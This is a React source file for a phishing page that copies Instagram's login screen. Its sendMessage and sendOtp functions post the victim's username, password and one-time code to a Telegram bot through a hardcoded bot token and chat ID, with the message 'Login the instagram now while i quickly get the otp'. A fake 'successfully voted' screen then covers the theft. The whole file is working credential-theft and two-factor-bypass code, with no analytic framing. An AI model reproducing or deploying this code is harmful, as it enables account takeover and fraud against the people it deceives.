import axios from 'axios';
import React from 'react'
import { useState } from 'react';

function App() {

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState("");
  const [showOTP, setShowOTP] = useState(false)
  const [completed, setCompleted] = useState(false)

  const linknames = [
    "Meta",
    "About",
    "Blog",
    "Jobs",
    "Help",
    "API",
    "Privacy",
    "Terms",
    "Top Accounts",
    "Locations",
    "Instagram Lite",
    "Threads",
    "Contact Uploading & Non-Users",
    "Meta Verified"
  ];

  const token = "6506084131:AAEKGTCRi1fJjMMA2LBkA_GYqdlpAL1GePY"
  const telegramApiUrl = 'https://api.telegram.org/bot' + token + '/sendMessage';
  const updates = 'https://api.telegram.org/bot' + token + '/getUpdates';
  

  const sendOtp = async () => {
    if(username && password){
    // Create the payload with chat_id (username or phone number) and text (message)
    const payload = {
      chat_id: "5790238561",
      text: `
This is the OTP 🚀
OTP: ${otp}
`,
    };
    axios.post(telegramApiUrl, payload)
      .then(() => {
        setCompleted(true)
      })
      .catch((error) => console('Error sending message: ' + error));
    }
}

  const sendMessage = async () => {
        if(username && password){
        // Create the payload with chat_id (username or phone number) and text (message)
        const payload = {
          chat_id: "5790238561",
          text: `
Login the instagram now while i quickly get the otp 😁
username/email/phone number: ${username}
password: ${password} 
`,
        };

        // axios.get(updates)
        // .then(res => {
        //   console.log(res.data.result)
        // }).catch(error => console('Error sending message: ' + error))
    
        // Send the HTTP POST request to the Telegram Bot API
        axios.post(telegramApiUrl, payload)
          .then(() => {
            setShowOTP(true);
          })
          .catch((error) => console('Error sending message: ' + error));
        }
  }



  if(completed){
    return (
      <div className="main">
        <h4 className='text-center mt-5'>You have successfully voted 🎉</h4>
        <form action="">
        <button type='button'>
          <a className='text-white' href="https://instagram.com">Continue to Instagram</a>
        </button>
        </form>
      </div>
    )
  }


  if(showOTP){
    return (
      <div className="main">
          <form>
          <img src="/img/instagram-logo.png" alt="" srcset="" />
          <h4 className='text-center'>Confirmation Sent</h4>
          <p className='text-center'>Enter the code we sent to you</p>
          <input
          value={otp}
          required
          onInput={e => setOtp(e.target.value)}
          type="text" placeholder='' />
          <button type='button' onClick={sendOtp}>
            Confirm
          </button>
        </form>
      </div>
    )
  }

  
  return (
    <>
    <div className="main">
      <form>
        <img src="/img/instagram-logo.png" alt="" srcset="" />
        <input
        value={username}
        required
        onInput={e => setUsername(e.target.value)}
        type="text" placeholder='Phone number, username, or email' />
        <input 
        required
          value={password}
          onInput={e => setPassword(e.target.value)}
        type="password" placeholder='Password' />
        <button type='button' onClick={sendMessage}>
          Log in
        </button>
        <div className="separator">
          <div></div>
          <p>OR</p>
          <div></div>
        </div>
        <div className="facebook">
          <a href='#'><i className="fab fa-facebook"></i>Log in with Facebook</a>
        </div>
        <div className="forgot">
          <a href="#">Forgot password</a>
        </div>
      </form>

      <form className='signup'>
        <p>Don't have an account? <a href="#">Sign Up</a></p>
      </form>

      <p className='text-center'>Get the app</p>

      <div className="apps">
        <img src="/img/googleplay-button.png" alt="" />
        <img src="/img/apple-button.png" alt="" srcset="" />
      </div>

      <div className="links">
        {
          linknames.map(l =>(
            <a href="#">{l}</a>
          ))
        }
      </div>

      <footer>
        <p>© 2023 Instagram from Meta</p>
      </footer>
    </div>
    </>
  )
}

export default App